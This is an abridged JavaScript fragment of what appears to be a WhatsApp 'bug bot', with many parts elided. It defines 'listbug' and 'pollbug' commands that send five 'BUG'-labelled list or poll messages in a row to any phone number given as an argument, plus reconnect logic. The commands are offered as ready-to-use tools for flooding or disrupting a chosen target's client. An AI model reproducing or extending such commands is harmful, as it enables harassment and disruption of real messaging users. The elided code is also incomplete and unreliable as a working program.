...
async function loadCommands() {
    ...
    const defaultCmds = {
       ...
       'listbug.js': `export default { name: 'listbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<5;i++)await sock.sendMessage(t,{text:'NOSTOC-V7-LIST',footer:'BUG',buttonText:'CLICK',sections:[{title:'BUG',rows:[{title:'BUG',rowId:'1'},{title:'BUG',rowId:'2'}]}]}); return \`V7 LIST BUG x5\`; } };`,
        ...
        'pollbug.js': `export default { name: 'pollbug', cooldown: 20000, execute: async (a,s,bn,v,c,st,sock) => { const t=a[0]?a[0]+'@s.whatsapp.net':s; for(let i=0;i<5;i++)await sock.sendMessage(t,{poll:{name:'NOSTOC-V7-POLL',values:['BUG','BUG','BUG'],selectableCount:1}}); return \`V7 POLL BUG x5\`; } };`,
...
async function startBot() {
    ...
    sock.ev.on('connection.update', async (update) => {
        ...
        if(connection === 'close') { 
            ...
            console.log(chalk.red(`> Bot disconnected. Reconnecting in 5s...`))
            if(shouldReconnect) {
                setTimeout(() => {
                    startBot();
                }, 5000)
